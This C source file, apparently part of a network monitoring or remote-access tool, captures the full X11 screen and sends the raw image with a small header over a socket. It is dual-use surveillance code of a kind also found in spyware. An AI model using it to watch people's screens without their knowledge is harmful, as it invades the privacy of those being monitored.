#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include "network/utils/net_utils.h"
#include "network/monitoring.h"

static int prepare_screenshot_buffer(ImageData *data, unsigned char **buffer, size_t *len_buffer){
    size_t header_size = 12;
    size_t image_size = data->width * data->height * (data->bits_per_pixel / 8);
    size_t total_size = header_size + image_size;

    *buffer = (unsigned char *)malloc(total_size);
    if (*buffer == NULL) return 1;

    uint32_t *header = (uint32_t *)(*buffer);
    header[0] = htonl(data->width);
    header[1] = htonl(data->height);
    header[2] = htonl(data->bits_per_pixel);

    memcpy(*buffer + header_size, data->image_data, image_size);
    *len_buffer = total_size;
    return 0;
}


int create_screenshot(int sock) {
    ImageData img;
    Display *display;
    int send_code = 0;
    unsigned char *buffer;
    size_t len_buffer;

    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Failed to connect to the X server\n");
        return send_code;
    }

    int screen = DefaultScreen(display);
    Window root = RootWindow(display, screen);
    img.width = DisplayWidth(display, screen);
    img.height = DisplayHeight(display, screen);
    printf("Display dimensions: %dx%d\n", img.width, img.height);

    XImage *image = XGetImage(display, root, 0, 0, img.width, img.height, AllPlanes, ZPixmap);
    if (image == NULL) {
        fprintf(stderr, "Failed to create screenshot\n");
        XCloseDisplay(display);
        return send_code;
    }
    img.bits_per_pixel = image->bits_per_pixel;
    img.image_data = (const unsigned char *)image->data;

    if (!prepare_screenshot_buffer(&img, &buffer, &len_buffer)){
        send_code = safe_send(sock, buffer, len_buffer);
        free(buffer);
    }

    XDestroyImage(image);
    return send_code;
}